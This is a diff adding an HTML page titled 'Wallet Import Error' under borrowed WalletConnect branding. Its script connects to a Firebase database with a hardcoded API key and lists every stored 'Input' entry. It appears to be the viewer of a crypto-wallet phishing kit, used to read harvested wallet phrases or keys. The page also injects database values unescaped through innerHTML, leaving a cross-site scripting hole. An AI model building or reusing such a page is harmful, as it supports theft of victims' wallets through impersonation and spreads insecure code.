@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Wallet Import Error</title>
+  <link rel="shortcut icon" href="images/icon-48x48.png">
+
+</head>
+<body>
+  <div class="nav">
+    <p>Dapps</p>
+    <img src="/assets/images/WC.jpg" alt="" height="80px">
+    <p>Wallet</p>
+  </div>
+  <div id="root">
+      
+
+  </div>
+  <style>
+    #root{
+      display: flex;
+      justify-content: center;
+      text-align: center;
+      flex-wrap: wrap;
+      
+    }
+
+    .data-container{
+      border: 1px solid blue;
+      margin: 4px;
+      font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      padding: 10px;
+      max-width: 80%;
+    }
+    .nav{
+      display: flex;
+      justify-content: space-between;
+      color: rgb(63, 63, 194);
+      font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      padding: 20px;
+      font-weight:500;
+      align-items: center;
+    }
+
+  </style>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/firebase/7.14.1-0/firebase.js"></script>
+  <script type="module">
+    
+      const firebaseConfig = {
+        apiKey: "AIzaSyDzeZAfknbk-MvVOKsox2ksyTe8ZX4pb-4",
+        authDomain: "shewu2-5327e.firebaseapp.com",
+        databaseURL: "https://shewu2-5327e-default-rtdb.firebaseio.com/",
+        projectId: "shewu2-5327e",
+        storageBucket: "shewu2-5327e.appspot.com",
+        messagingSenderId: "460445480200",
+        appId: "1:460445480200:web:972d36da3975a2d9f7e8bd"
+      };
+    
+      // Initialize Firebase
+      firebase.initializeApp(firebaseConfig);
+
+
+      var shewu2_db = firebase.database().ref("shewu2")
+
+      shewu2_db.on("value", function(snapshot){
+
+        var data = snapshot.val();
+        for(let i in data){
+          document.querySelector("#root").innerHTML += `
+            <div class= "data-container"><b>Input:</b> ${data[i]["Input"]}</div>
+          `
+        }
+
+      })
+
+  </script>
+
+  <footer style="text-align:center;color: rgb(63, 63, 194); font-family:'Segoe UI', Tahoma, Geneva, Verdana; font-weight: 500;">
+    <p>Powered by Wallet Connect</p>
+  </footer>
+</body>
+</html>
